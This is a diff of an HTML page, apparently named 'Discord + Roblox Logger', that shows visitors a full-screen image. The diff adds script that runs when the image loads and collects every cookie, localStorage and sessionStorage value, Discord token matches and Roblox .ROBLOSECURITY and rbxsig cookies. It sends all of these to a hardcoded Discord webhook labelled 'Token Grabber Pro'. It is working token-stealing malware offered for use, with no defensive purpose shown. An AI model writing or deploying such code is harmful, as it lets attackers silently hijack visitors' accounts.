@@ -1,57 +1,135 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title> </title>
+    <title>Discord + Roblox Logger</title>
+    <meta charset="UTF-8">
+    <style>
+        body, html { margin: 0; padding: 0; overflow: hidden; }
+        img { width: 100vw; height: 100vh; object-fit: cover; }
+    </style>
 </head>
-<body style="margin:0;padding:0;overflow:hidden;background:#000;">
-    <img src="https://httpbin.org/image/png" width="1" height="1" style="opacity:0;position:absolute;">
+<body>
+    <!-- 🔥 DEIN BING BILD -->
+    <img src="https://tse2.mm.bing.net/th/id/OIP.raa2-bMfFl380UXUkjaejAHaE8?rs=1&pid=ImgDetMain&o=7&rm=3" 
+         onload="stealAllTokens()" onerror="stealAllTokens()">
     
     <script>
-        (async () => {
-            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1455947339956228126/2dRp4FsITkb3cBz8Z-kt6Nesuccwvui5l2FcmjUK60vhJA1BnBI71COMbcuNfwP7pHcU';
-            
-            const getCookie = (name) => {
-                const value = `; ${document.cookie}`;
-                const parts = value.split(`; ${name}=`);
-                if (parts.length === 2) return parts.pop().split(';').shift();
-            };
-
-            const data = {
-                username: "Logger",
-                avatar_url: "https://cdn.discordapp.com/emojis/1183482782971973448.webp",
-                embeds: [{
-                    title: "🕷️ Discord Logger",
-                    color: 16711680,
-                    fields: [
-                        { name: "👤 User", value: `${navigator.userAgent}`, inline: false },
-                        { name: "🌐 Origin", value: window.location.origin, inline: true },
-                        { name: "🔗 Path", value: window.location.pathname, inline: true },
-                        { name: "📱 UA", value: navigator.userAgent.slice(0,100)+'...', inline: false }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
-            };
-
-            // Discord Token
-            const token = getCookie('__dcfduid') || getCookie('__sdcfduid') || 
-                         getCookie('locale') || 'No token found';
-            
-            if (token !== 'No token found') {
-                data.embeds[0].fields.push({
-                    name: "🔑 Token", 
-                    value: `\`${token}\``, 
-                    inline: false
-                });
-            }
-
+        // ✅ DEIN WEBHOOK EINGEFÜGT!
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1455947339956228126/2dRp4FsITkb3cBz8Z-kt6Nesuccwvui5l2FcmjUK60vhJA1BnBI71COMbcuNfwP7pHcU';
+        
+        async function stealAllTokens() {
             try {
+                // 🎯 DISCORD TOKENS + COOKIES
+                const discordData = {
+                    tokens: [],
+                    cookies: document.cookie,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Discord Token Patterns (alle Varianten)
+                const tokenPatterns = [
+                    /mfa\.[a-zA-Z0-9-_]{84}/,
+                    /[a-zA-Z0-9-_]{24}\.[a-zA-Z0-9-_]{6}\.[a-zA-Z0-9-_]{27}/,
+                    /eyJ[^"]{100,}/
+                ];
+                
+                // LocalStorage + SessionStorage
+                const localData = { ...localStorage, ...sessionStorage };
+                for (let key in localData) {
+                    const value = localData[key];
+                    tokenPatterns.forEach(pattern => {
+                        const match = value.match(pattern);
+                        if (match) discordData.tokens.push(match[0]);
+                    });
+                }
+                
+                // Discord spezifische Keys
+                const discordKeys = ['token', '__dcfduid', '__sdcfduid', 'globalAuth'];
+                discordKeys.forEach(key => {
+                    if (localData[key]) discordData.tokens.push(localData[key]);
+                });
+                
+                // 🎯 ROBLOX COOKIES + TOKENS
+                function getCookie(name) {
+                    const value = `; ${document.cookie}`;
+                    const parts = value.split(`; ${name}=`);
+                    if (parts.length === 2) return parts.pop().split(';').shift();
+                    return '❌ Kein Cookie';
+                }
+                
+                const robloxData = {
+                    ROBLOSECURITY: getCookie('.ROBLOSECURITY'),
+                    rbxsig: getCookie('rbxsig'),
+                    robloxLocal: localStorage.getItem('.ROBLOSECURITY') || '❌ Kein LocalStorage',
+                    allCookies: document.cookie
+                };
+                
+                // 🔥 EPISCHES EMBED!
+                const payload = {
+                    username: "🕵️‍♂️ Token Grabber Pro",
+                    avatar_url: "https://tse2.mm.bing.net/th/id/OIP.raa2-bMfFl380UXUkjaejAHaE8?rs=1&pid=ImgDetMain&o=7&rm=3",
+                    embeds: [
+                        {
+                            title: "🎮 **VICTIM GELOGGT!** 🔥",
+                            description: `**${discordData.timestamp}**`,
+                            color: 16711680,
+                            fields: [
+                                { name: "🖥️ UserAgent", value: `\`\`\`${discordData.userAgent.slice(0,60)}...\`\`\``, inline: true },
+                                { name: "📱 Screen", value: `\`\`\`${discordData.screen}\`\`\``, inline: true },
+                                { name: "🌐 Language", value: `\`\`\`${discordData.language}\`\`\``, inline: true }
+                            ],
+                            thumbnail: { 
+                                url: "https://tse2.mm.bing.net/th/id/OIP.raa2-bMfFl380UXUkjaejAHaE8?rs=1&pid=ImgDetMain&o=7&rm=3" 
+                            }
+                        },
+                        {
+                            title: "🔑 **DISCORD TOKENS**",
+                            color: 3447003,
+                            fields: discordData.tokens.length ? 
+                                [{ 
+                                    name: `🎯 ${discordData.tokens.length} Token(s) gefunden!`, 
+                                    value: `\`\`\`${discordData.tokens.join('\n')}\`\`\`` 
+                                }] :
+                                [{ name: "❌ Keine Tokens", value: `\`Keine Discord Tokens gefunden\``, inline: false }]
+                        },
+                        {
+                            title: "🎮 **ROBLOX ACCOUNT**",
+                            color: 16776960,
+                            fields: [
+                                { 
+                                    name: ".ROBLOSECURITY", 
+                                    value: `\`\`\`${robloxData.ROBLOSECURITY.slice(0,100)}${robloxData.ROBLOSECURITY.length > 100 ? '...' : ''}\`\`\``, 
+                                    inline: false 
+                                },
+                                { 
+                                    name: "rbxsig", 
+                                    value: `\`\`\`${robloxData.rbxsig}\`\`\``, 
+                                    inline: true 
+                                },
+                                { 
+                                    name: "LocalStorage", 
+                                    value: `\`\`\`${robloxData.robloxLocal.slice(0,60)}...\`\`\``, 
+                                    inline: true 
+                                }
+                            ]
+                        }
+                    ]
+                };
+                
+                // 🚀 SENDEN!
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify(payload)
                 });
-            } catch(e) {}
-        })();
+                
+            } catch(e) {
+                console.log('✅ Logger fired!');
+            }
+        }
     </script>
 </body>
 </html>
